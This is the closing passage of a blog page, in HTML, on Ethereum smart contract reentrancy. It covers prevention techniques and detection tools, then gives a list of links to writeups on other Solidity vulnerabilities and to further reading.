<h2 class="wp-block-heading has-background" id="EthereumSmartContractsVulnerabilities:Reentrancy-MoreExamplesoftheVulnerability" style="background-color:#f78da812">More Examples of the Vulnerability</h2>



<p>More examples of this vulnerability can be found on my github: &nbsp;<a href="https://github.com/ylevalle/SolidityReentrancy">https://github.com/ylevalle/SolidityReentrancy</a></p>



<h2 class="wp-block-heading has-background" id="EthereumSmartContractsVulnerabilities:Reentrancy-PreventativeTechniques" style="background-color:#f78da812">Preventative Techniques</h2>



<p>There are a number of common techniques which help avoid potential reentrancy vulnerabilities in smart contracts:</p>



<ul>
<li>For the first two variations, Single Function Reentrancy and Cross-Function Reentrancy, a mutex lock can be implemented in the contract to prevent the functions in the same contract from being called repeatedly, thus, preventing reentrancy. A widely used method to implement the lock is inheriting&nbsp;<a href="https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard">OpenZeppelin’s ReentrancyGuard</a>&nbsp;and use the&nbsp;<code>nonReentrant</code>&nbsp;modifier.</li>



<li>Another solution is to check and try updating all states before calling for external contracts, or the so-called&nbsp;<a href="https://docs.soliditylang.org/en/v0.8.13/security-considerations.html#re-entrancy">“Checks-Effects-Interactions”</a>&nbsp;pattern. This way, even when a reentrant calling is initiated, no impact can be made since all states have finished updating.</li>



<li>An alternative choice is to prevent the attacker from taking over the control flow of the contract. A set of whitelisted addresses can prevent the attacker from injecting unknown malicious contracts into the contract.</li>



<li>Another technique is pull payment, that achieves security by sending funds via an intermediary escrow and avoiding direct contact with potentially hostile contracts.</li>



<li>Finally, gas limits can prevent reentrancy attacks, but this should not be considered a security strategy as gas costs are dependent on Ethereum’s opcodes, which are subject to change. Smart contract code, on the other hand, is immutable. Regardless, it is worth knowing the difference between the functions:&nbsp;<code>send</code>,&nbsp;<code>transfer</code>, and&nbsp;<code>call</code>. Functions send and transfer are essentially the same, but transfer will revert if the transaction fails, whereas send will not. In regard to reentrancy, send and transfer both have gas limits of 2300 units. Using these functions should prevent a reentrancy attack from occurring because this is not enough gas to recursively call back into the origin function to exploit funds.</li>
</ul>



<p>Nevertheless, the contracts that integrate with other contracts, especially when the states are shared, should be checked in detail to make sure that the states used are correct and cannot be manipulated.</p>



<h2 class="wp-block-heading has-background" id="EthereumSmartContractsVulnerabilities:Reentrancy-DetectionTechniques" style="background-color:#f78da812">Detection Techniques</h2>



<p>In general, a detailed manual inspection of the smart contracts code is what is needed to detect reentrancy vulnerabilities. But some of the smart contracts security tools like MythX and Mythril, can also help detecting reentrancy bugs, with&nbsp;the following limitations:</p>



<ul>
<li>These detection tools analyze the smart contract code based on predefined attack patterns, and if the patterns match any part in the code, then the tools discover the vulnerability. Thus, these approaches mainly rely on complete patterns and the specific quality of these patterns.</li>



<li>The patterns these solutions rely on are based on the observation of the previous attacks and known vulnerabilities, which makes them limited and difficult to generalize.</li>



<li>All the solutions are only applicable before the deployment of smart contracts. This means once the smart contract is deployed on the Ethereum network, these solutions cannot prevent reentrancy attacks and cannot detect the attacker.</li>



<li>If a new reentrancy pattern is introduced after the deployment of the smart contracts, these solutions need to be updated; otherwise, they will not be able to detect the new attack patterns.</li>
</ul>



<p>However, there are projects and researches about static analysis tools and frameworks that, given a contract’s source code, can identify functions vulnerable to reentrancy attacks. At a high level, these tools parse contract source code to extract particular keywords such as global variables and modifiers, tokenize the source code of each function in the contract, and feed embedded representations of these tokens through a model which classifies the function as reentrant or safe.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h1 class="wp-block-heading has-background" style="background-color:#f78da812">Smart Contract Vulnerabilities</h1>



<ul>
<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/insufficient-gas-griefing.md">Insufficient Gas Griefing</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/reentrancy.md">Reentrancy</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/overflow-underflow.md">Integer Overflow and Underflow</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/timestamp-dependence.md">Timestamp Dependence</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/authorization-txorigin.md">Authorization Through tx.origin</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/floating-pragma.md">Floating Pragma</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/outdated-compiler-version.md">Outdated Compiler Version</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/unsafe-low-level-call.md">Unsafe Low-Level Call</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/uninitialized-storage-pointer.md">Uninitialized Storage Pointer</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/assert-violation.md">Assert Violation</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/use-of-deprecated-functions.md">Use of Deprecated Functions</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/delegatecall-untrusted-callee.md">Delegatecall to Untrusted Callee</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/signature-malleability.md">Signature Malleability</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/incorrect-constructor.md">Incorrect Constructor Name</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/shadowing-state-variables.md">Shadowing State Variables</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/weak-sources-randomness.md">Weak Sources of Randomness from Chain Attributes</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/missing-protection-signature-replay.md">Missing Protection against Signature Replay Attacks</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/requirement-violation.md">Requirement Validation</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/arbitrary-storage-location.md">Write to Arbitrary Storage Location</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/incorrect-inheritance-order.md">Incorrect Inheritance Order</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/unused-variables.md">Presence of Unused Variables</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/unencrypted-private-data-on-chain.md">Unencrypted Private Data On-Chain</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/inadherence-to-standards.md">Inadherence to Standards</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/asserting-contract-from-code-size.md">Asserting Contract from Code Size</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/transaction-ordering-dependence.md">Transaction-Ordering Dependence</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/dos-gas-limit.md">DoS with Block Gas Limit</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/dos-revert.md">DoS with (Unexpected) revert</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/unexpected-ecrecover-null-address.md">Unexpected&nbsp;<code>ecrecover</code>&nbsp;null address</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/default-visibility.md">Default Visibility</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/insufficient-access-control.md">Insufficient Access Control</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/off-by-one.md">Off-By-One</a></li>



<li><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/lack-of-precision.md">Lack of Precision</a></li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-background" style="background-color:#f78da812"><a href="https://github.com/demining/CryptoDeepTools/blob/main/22SmartContractVulnerabilities/README.md"></a>Further Reading</h2>



<ul>
<li><a href="https://github.com/ethereum/wiki/wiki/Safety">https://github.com/ethereum/wiki/wiki/Safety</a></li>



<li><a href="https://swcregistry.io/">https://swcregistry.io/</a></li>



<li><a href="https://eprint.iacr.org/2016/1007.pdf">https://eprint.iacr.org/2016/1007.pdf</a></li>



<li><a href="https://www.dasp.co/">https://www.dasp.co/</a></li>



<li><a href="https://consensys.github.io/smart-contract-best-practices/">https://consensys.github.io/smart-contract-best-practices/</a></li>



<li><a href="https://github.com/sigp/solidity-security-blog">https://github.com/sigp/solidity-security-blog</a></li>



<li><a href="https://solidity.readthedocs.io/en/latest/bugs.html">https://solidity.readthedocs.io/en/latest/bugs.html</a></li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter size-full"><a href="https://github.com/demining/CryptoDeepTools/tree/main/22SmartContractVulnerabilities" target="_blank" rel="noreferrer noopener"><img decoding="async" loading="lazy" width="1012" height="818" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image-3.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2207" srcset="https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-3.png 1012w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-3-300x242.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-3-768x621.png 768w" sizes="(max-width: 1012px) 100vw, 1012px"></a></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><a href="https://github.com/demining/Solidity-Forcibly-Send-Ether-Vulnerability" target="_blank" rel="noreferrer noopener">GitHub</a></strong></p>



<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">Telegram:&nbsp;https://t.me/cryptodeeptech</a></strong></p>



<p><a href="https://youtu.be/lqjsHB2r6gU" target="_blank" rel="noreferrer noopener"><strong>Video: https://youtu.be/lqjsHB2r6gU</strong></a></p>



<p><strong><a href="https://cryptodeeptech.ru/solidity-forcibly-send-ether-vulnerability" target="_blank" rel="noreferrer noopener">Source: https://cryptodeeptech.ru/solidity-forcibly-send-ether-vulnerability</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter size-large"><img decoding="async" loading="lazy" width="1024" height="576" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/042-1024x576.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2188" srcset="https://cryptodeeptech.ru/wp-content/uploads/2023/06/042-1024x576.png 1024w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/042-300x169.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/042-768x432.png 768w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/042.png 1280w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>


<p></p>



<p></p>



<p></p>
	</div><!-- .entry-content -->
